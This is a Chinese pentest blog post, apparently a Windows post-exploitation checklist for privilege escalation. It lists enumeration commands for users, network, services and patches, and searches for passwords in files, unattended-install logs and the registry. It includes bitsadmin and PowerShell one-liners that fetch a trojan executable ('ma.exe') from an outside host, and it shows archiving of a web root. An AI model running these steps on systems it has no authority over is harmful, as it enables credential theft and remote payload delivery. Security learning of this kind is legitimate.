<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="hark"><title>windows提权信息收集 | Bug'小虫</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">windows提权信息收集</h1><a id="logo" href="/.">Bug'小虫</a><p class="description">走过黑暗，前面便是光</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">windows提权信息收集</h1><div class="post-meta">Jan 15, 2018<span> | </span><span class="category"><a href="/categories/提权/">提权</a></span></div><div class="post-content"><h3 id="1-收集OS名称和版本信息"><a href="#1-收集OS名称和版本信息" class="headerlink" title="1. 收集OS名称和版本信息"></a>1. 收集OS名称和版本信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:<span class="string">"OS Name"</span> /C:<span class="string">"OS Version"</span> </span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">"OS 版本"</span></span><br></pre></td></tr></table></figure>
<h3 id="2-主机名称和所有环境变量"><a href="#2-主机名称和所有环境变量" class="headerlink" title="2. 主机名称和所有环境变量"></a>2. 主机名称和所有环境变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机名称：hostname</span><br><span class="line">环境变量：SET</span><br></pre></td></tr></table></figure>
<h3 id="3-查看用户信息"><a href="#3-查看用户信息" class="headerlink" title="3. 查看用户信息"></a>3. 查看用户信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看所有用户：net user 或者net1 user</span><br><span class="line">查看管理员用户组：net localgroup administrators或者net1 localgroup administrators</span><br><span class="line">查看远程终端在线用户：query user 或者quser</span><br></pre></td></tr></table></figure>
<h3 id="4-查看远程端口"><a href="#4-查看远程端口" class="headerlink" title="4. 查看远程端口"></a>4. 查看远程端口</h3><p>(1)注册表查看<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server\WinStations\RDP-Tcp /v PortNumber</span><br></pre></td></tr></table></figure></p>
<p>(2)通过命令行查看<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取对应的PID号：tasklist /svc | find <span class="string">"TermService"</span></span><br><span class="line">通过PID号查找端口：netstat -ano | find <span class="string">"1980"</span></span><br></pre></td></tr></table></figure></p>
<h3 id="5-查看网络情况"><a href="#5-查看网络情况" class="headerlink" title="5. 查看网络情况"></a>5. 查看网络情况</h3><p>(1)网络配置情况：ipconfig /all</p>
<p>(2)路由器信息： route print</p>
<p>(3)要查看ARP缓存： arp -A</p>
<p>(4)查看网络连接： netstat -ano</p>
<p>(5)要查看防火墙规则：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config  </span><br><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure></p>
<h3 id="6-应用程序和服务"><a href="#6-应用程序和服务" class="headerlink" title="6. 应用程序和服务"></a>6. 应用程序和服务</h3><p>(1)要查看服务的进程ID：tasklist /SVC</p>
<p>(2)已安装驱动程序的列表：DRIVERQUERY</p>
<p>(3)已经启动Windows 服务net start</p>
<p>(4)查看某服务启动权限：sc qc TermService</p>
<p>(5)已安装程序的列表：wmic product list brief</p>
<p>(6)查看服务列表：wmic service list brief # Lists services</p>
<p>(7)查看进程列表: wmic process list brief # Lists processes</p>
<p>(8)查看启动程序列表: wmic startup list brief # Lists startup items</p>
<p>(9)检查补丁已安装的更新和安装日期: wmic qfe get Caption,De**ion,HotFixID,InstalledOn<br>搜索，您可以使用提升权限的特定漏洞：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,De**ion,HotFixID,InstalledOn | findstr  /C:<span class="string">"KBxxxxxxx"</span></span><br></pre></td></tr></table></figure></p>
<p>执行上面的命令的没有输出，意味着那个补丁未安装。</p>
<p>(10)结束程序：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process <span class="built_in">where</span> name=<span class="string">"iexplore.exe"</span> call terminate</span><br></pre></td></tr></table></figure></p>
<h3 id="7-检索敏感文件"><a href="#7-检索敏感文件" class="headerlink" title="7. 检索敏感文件"></a>7. 检索敏感文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dir /b/s password.txt </span><br><span class="line">dir /b /s *.doc </span><br><span class="line">dir /b /s *.ppt </span><br><span class="line">dir /b /s *.xls </span><br><span class="line">dir /b /s *. docx </span><br><span class="line">dir /b /s *.xlsx </span><br><span class="line">dir /b/s config.* filesystem </span><br><span class="line">findstr /si password *.xml *.ini *.txt  </span><br><span class="line">findstr /si login *.xml *.ini *.txt</span><br></pre></td></tr></table></figure>
<p>除此之外，您还可以检查无人值守安装日志文件。这些文件通常包含base64编码的密码。你更可能在大型企业中，其中单个系统的手动安装是不切实际的，找到这些文件即可获取管理员密码。这些文件的共同位置是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br></pre></td></tr></table></figure></p>
<h3 id="8-目录文件操作"><a href="#8-目录文件操作" class="headerlink" title="8. 目录文件操作"></a>8. 目录文件操作</h3><p>(1)列出d:\www的所有目录：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /d %i <span class="keyword">in</span> (d:\www\*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure></p>
<p>(2)把当前路径下文件夹的名字只有1-3个字母的显示出来：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /d %i <span class="keyword">in</span> (???) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure></p>
<p>(3)以当前目录为搜索路径，把当前目录与下面的子目录的全部EXE文件列出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r %i <span class="keyword">in</span> (*.exe) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure></p>
<p>(4)以指定目录为搜索路径，把当前目录与下面的子目录的所有文件列出<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r <span class="string">"f:\freehost\hmadesign\web\" %i in (*.*) do @echo %i</span></span><br></pre></td></tr></table></figure></p>
<p>(5)显示a.txt里面的内容，因为/f的作用，会读出a.txt中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f %i <span class="keyword">in</span> (c:\1.txt) <span class="keyword">do</span> <span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure></p>
<h3 id="9-RAR打包"><a href="#9-RAR打包" class="headerlink" title="9. RAR打包"></a>9. RAR打包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar a -k -r -s -m3 c:\1.rar d:\wwwroot</span><br></pre></td></tr></table></figure>
<h3 id="10-php读文件"><a href="#10-php读文件" class="headerlink" title="10. php读文件"></a>10. php读文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:/php/php.exe <span class="string">"c:/www/admin/1.php"</span></span><br></pre></td></tr></table></figure>
<h3 id="11-Windows7及以上的版本操作系统文件下载可以使用的bitsadmin和powershell："><a href="#11-Windows7及以上的版本操作系统文件下载可以使用的bitsadmin和powershell：" class="headerlink" title="11. Windows7及以上的版本操作系统文件下载可以使用的bitsadmin和powershell："></a>11. Windows7及以上的版本操作系统文件下载可以使用的bitsadmin和powershell：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer myjob1 /download /priority normal http://www.antian365.com/lab/4433.exe c:\ma.exe </span><br><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(<span class="string">' http://www.antian365.com/ma.exe'</span>,<span class="string">'ma.exe'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="12-注册表关键字搜索，password为关键字，可以是vnc等敏感关键字"><a href="#12-注册表关键字搜索，password为关键字，可以是vnc等敏感关键字" class="headerlink" title="12. 注册表关键字搜索，password为关键字，可以是vnc等敏感关键字"></a>12. 注册表关键字搜索，password为关键字，可以是vnc等敏感关键字</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM /f password /t REG_SZ /s </span><br><span class="line">reg query HKCU /f password /t REG_SZ /s</span><br></pre></td></tr></table></figure>
<p>###13.系统权限配置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cacls c:\ </span><br><span class="line">cacls c:\windows\ma.exe 查看ma.exe的权限配置</span><br></pre></td></tr></table></figure></p>
<h3 id="14-自动收集系统有用信息脚本"><a href="#14-自动收集系统有用信息脚本" class="headerlink" title="14.自动收集系统有用信息脚本"></a>14.自动收集系统有用信息脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f <span class="string">"delims="</span> %%A <span class="keyword">in</span> (<span class="string">'dir /s /b %WINDIR%\system32\*htable.xsl'</span>) <span class="keyword">do</span> <span class="built_in">set</span> <span class="string">"var=%%A"</span> </span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic USERACCOUNT list full /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic group list full /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic nicconfig <span class="built_in">where</span> IPEnabled=<span class="string">'true'</span> get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic netuse list full /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic startup get Caption,Command,Location,User /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:<span class="string">"%var%"</span> &gt;&gt; out.html </span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br></pre></td></tr></table></figure>
</div><div class="tags"><a href="/tags/windows提权/">windows提权</a></div><div class="post-nav"><a class="pre" href="/2018/01/15/MS16-075提权/">MS16-075提权</a><a class="next" href="/2018/01/15/Lcx端口转发/">Lcx端口转发</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/herly/">herly</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/提权/">提权</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/其他/" style="font-size: 15px;">其他</a> <a href="/tags/javascript/" style="font-size: 15px;">javascript</a> <a href="/tags/windows提权/" style="font-size: 15px;">windows提权</a> <a href="/tags/parrot/" style="font-size: 15px;">parrot</a> <a href="/tags/注入/" style="font-size: 15px;">注入</a> <a href="/tags/工具/" style="font-size: 15px;">工具</a> <a href="/tags/windows/" style="font-size: 15px;">windows</a> <a href="/tags/资源/" style="font-size: 15px;">资源</a> <a href="/tags/其它/" style="font-size: 15px;">其它</a> <a href="/tags/Windows2003/" style="font-size: 15px;">Windows2003</a> <a href="/tags/rad-linux/" style="font-size: 15px;">rad linux</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/关于本博客/">关于本博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/27/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/20/vim常用命令总结/">vim常用命令总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/28/PHP手工注入笔记 /">PHP手工注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/mysql手工注入之load_file()应用/">mysql手工注入之load_file()应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/28/渗透过程中总结的一些技巧/">PHP手工注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/保证session不被服务器因超时注销/">即可保证session不被服务器因超时注销</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/htaccess配合apache 提权/">htaccess配合apach提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/MS16-075提权/">MS16-075提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/15/windows提权信息收集/">windows提权信息收集</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">Bug'小虫.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>